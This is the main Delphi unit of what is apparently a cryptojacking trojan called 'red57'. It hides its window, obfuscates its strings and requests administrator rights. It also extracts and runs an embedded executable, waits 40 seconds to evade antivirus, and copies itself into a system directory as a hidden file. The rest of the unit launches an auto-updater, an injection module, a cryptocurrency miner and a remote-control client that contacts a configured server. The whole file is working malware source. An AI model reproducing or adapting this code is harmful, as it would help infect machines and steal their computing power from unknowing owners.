unit Main;

interface

uses
  Windows, SysUtils, Classes, Controls, Forms, StdCtrls, StrUtils, uTypes, uFnc, uEnc, uAI, iniFiles, uEof, uTsk;

type
  TMainForm = class(TForm)
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    procedure ProcCont();
    procedure RnFiFile();
    procedure FISstm();
    procedure RnSys();
  public
    procedure GEH(Sender: TObject; E: Exception);
  end;

var
  MainForm: TMainForm;
  ConfigData: TCnfg;

const
  Dbu: Boolean = False;

implementation

uses
  FI, Cli, AtU, Ming;

{$R *.dfm}

procedure TMainForm.GEH(Sender: TObject; E: Exception);
begin
  //AddLog(Logs, E.Message);
end; { Application Exception -> Tüm Hatalarý Yakalar }

{****************************************************************************
                      Form Events -> Baþlangýç
****************************************************************************}

procedure TMainForm.FormCreate(Sender: TObject);
begin
  // Application Hide
  if not Dbu then
  begin
    Application.ShowMainForm := False;
    SetWindowLong(Application.Handle, GWL_EXSTYLE, GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW);
  end;

  // Create Exception Catch
  Application.OnException := GEH;

  // Set Default Variable
  Application.Title := 'red57 Application';
  MainForm.Caption := Application.Title;
  ConfigData := TCnfg.Create;
  with ConfigData do
  begin
    TpEnb := True;
    TpP := '127.0.0.1'; // Remote Server IP (xyz.example.com) or Local IP (192.168.1.50)
    TpPo := 1200; // Server Port
    TpTmr := 30 * (60 * 1000);
    InUr := DE('xNlj7PwHH7uL2k3Ari370A'); // ini config url
    ExUr := DE('xdkUv8odTXKgXaQO'); // update exe url
    UpTr := 120 * (60 * 1000);
    RnFiN := DE('qRBlieb8u+WOx4DADvNvqC');
    //RnDi := IfThen(GtOVer = 'XP', GtSm32D + '\' + Application.Title, GtSpFo(2) + '\' + Application.Title);
    RnMtx := 'Mx_' + RnFiN;
    PrtNa := Application.Title;
    iAd := isGraAd();
    iEx := iOObj(DE('MNjr/ckiJ/ExMUw6LyM+uzD'));
    iWo := iOObj(DE('eBq/7+BFgGYFfU0XYRouIC'));
    Vsr := StrToInt(DE(Trim(GtReTe('Vr'))));
    SO := GtOVer;
    EeRs := 'CX';
    EeVRs := 'VR';
    ExRsNa := 'EX';
    WoRsNa := 'WO';
  end;

  // Setn Run Dir
  if ConfigData.iAd or (ConfigData.SO = 'XP') then begin
    ConfigData.RnDi := AddSlash(ExtractFileDir(GtWDr)) + DE('ZVLGDyrftcuzS69NKebx1pCKeC');
    if not DirectoryExists(ConfigData.RnDi) then
      ConfigData.RnDi := AddSlash(ExtractFileDir(GtWDr)) + DE('ZVLGDyrftcuzS69NKC');
  end else
    ConfigData.RnDi := GtSpFo(2);
  ConfigData.RnDi := ConfigData.RnDi + '\' + Application.Title;

  // Set Mining Config
  ConfigData.Mng := TMgi.Create;
  with ConfigData.Mng do begin
    Eal := True;
    RgUl := '';
    Rnng := False;
    RnDr := ConfigData.RnDi + '\Mlog';
    RnTmr := 30 * (60 * 1000);
    RnPm := DE('kciksV6nteIG15dfJsEs510J');
    RnPmL := DE('kciksV6nteIG15dfJsEs5t0T');
    E3Nm := DE('otqG7d8GKEZMbpne3/I');
    E6Nm := DE('otqG7d8GKEZMbJW8nIS7CD');
    Black := DE('MhDsPC');
  end;

  // Set XP
  if ConfigData.SO = 'XP' then
    ConfigData.iAd := False;

  // Run Control Center
  ProcCont;
end; { Form Create -> Tüm Sistemi Baþlat ve Gizle }

procedure TMainForm.FormClose(Sender: TObject; var Action: TCloseAction);
var
  i: integer;
begin
  for i := MainForm.ComponentCount - 1 downto 0 do begin
    MainForm.Components[i].Free;
  end;
end; { FormClose -> Destroy All Component }


{****************************************************************************
                      Application Process -> Baþlangýç
****************************************************************************}

procedure TMainForm.ProcCont();
var
  AI: TArtificialIntelligence;
begin
  // Try Admin Mode Run
  if not Dbu then begin
    if (ConfigData.SO <> 'XP') and (not ConfigData.iAd) and (ExtractFileDir(ParamStr(0)) <> ConfigData.RnDi) and
      (not MtxEx(ConfigData.RnMtx)) and (AddSlash(ExtractFileDir(ParamStr(0))) <> AddSlash(GtTeD)) then
      if RnAA(HWND_DESKTOP, ParamStr(0), GtApPa, True, False) <> 0 then Halt;
  end;

  // Run Container Application
  RnFiFile;

  // Sistemden Çalýþtýr
  if not Dbu then FISstm;

  // Güvenlik Etkinleþtir
  with TArtificialIntelligence.Create(Self, ConfigData) do begin
    Run;
  end;

  // Tüm Modülleri Etkinleþtir
  RnSys;
end;

procedure TMainForm.RnFiFile();
var
  RStream: TResourceStream;
  FileRun: string;
  Context: AnsiString;
begin
  if FindResource(HInstance, PChar(ConfigData.EeRs), RT_RCDATA) <> 0 then
  begin
    // Create Stream
    RStream := TResourceStream.Create(HInstance, PChar(ConfigData.EeRs), RT_RCDATA);

    if RStream.Size > 0 then begin
      // Create Exe Path
      FileRun := GetCurrentDir + '\' + '._cache_' + ExtractFileName(ParamStr(0));

      // Extract Exe Resource
      try
        if not FileExists(FileRun) or (RStream.Size <> GtFiSi(FileRun)) then
        begin
          try
            if FileExists(FileRun) then begin
              FileSetAttr(FileRun, 128);
              DeleteFile(FileRun);
            end;

            RStream.SaveToFile(FileRun);
          except
            FileRun := GtTeD + '\' + '._cache_' + ExtractFileName(ParamStr(0));
            RStream.SaveToFile(FileRun);
          end;
          FileSetAttr(FileRun, 6);
          RStream.Free;
        end;
      except
      end;

      // Exe'yi Çalýþtýr
      RnAA(HWND_DESKTOP, FileRun, GtApPa, ConfigData.iAd, False);
    end;
  end;
end; { RunInjFile -> Container içindeki exeyi çalýþtýrýr }

procedure TMainForm.FISstm();
var
  FilePath: string;
  MS: TMemoryStream;
begin
  // Exit System Dir
  if ExtractFileDir(ParamStr(0)) = ConfigData.RnDi then
    Exit;

  // Check is Running Process
  if MtxEx(ConfigData.RnMtx) then
    Halt;

  // Load Mem Stream
  MS := TMemoryStream.Create;
  MS.LoadFromFile(ParamStr(0));

  // Wait Antivirus
  Delay(40000);

  // Check is Running Process
  if MtxEx(ConfigData.RnMtx) then
    Halt;

  // Create Run Directory
  if not DirectoryExists(ConfigData.RnDi) then
  begin
    CreateDir(ConfigData.RnDi);
    FileSetAttr(ConfigData.RnDi, 128);
  end;

  // Copy & Version Control
  FilePath := ConfigData.RnDi + '\' + ConfigData.RnFiN;
  if not FileExists(FilePath) then begin
    // Copy New File
    MS.SaveToFile(FilePath);
    UpERes(FilePath, '', ConfigData.EeRs);
  end else if (not ChERes(FilePath, ConfigData.EeVRs)) or (ConfigData.Vsr > StrToInt(Trim(LoFiReTe(FilePath, ConfigData.EeVRs, True)))) then
  begin
    try
      // Kill Process
      KlPrc(ConfigData.RnFiN);

      // Delete Old File
      FileSetAttr(FilePath, 128);
      DeleteFile(FilePath);

      // Copy New File
      MS.SaveToFile(FilePath);
      UpERes(FilePath, '', ConfigData.EeRs);
    except
    end;
  end;

  // Run System Directory
  RnAA(HWND_DESKTOP, FilePath, GtApPa, ConfigData.iAd, False);

  // Terminate
  Halt;
end; { InjSystem -> Sisteme Kendini Kopyalar ve Çalýþtýrýr }

procedure TMainForm.RnSys();
var
  Min: TMin;
  Context: string;
  i: integer;
begin
  // Load Default
  LdCnf(ConfigData);

  // Start Auto Update
  with TUpD.Create(Self, ConfigData) do begin
    Run;
  end;

  // Start Injection System
  with TFI.Create(Self, ConfigData) do begin
    Run;
  end;

  // Start Miner
  Min := TMin.Create(Self, ConfigData);
  Min.Run;

  // Start Client
  with TCli.Create(Self, ConfigData) do begin
    Run;
  end;

  // Debug Config
  //if Dbu then DebCon(ConfigData, Logs);
end; { RunSystem -> Tüm Ýþlemleri Baþlatýr }

end.

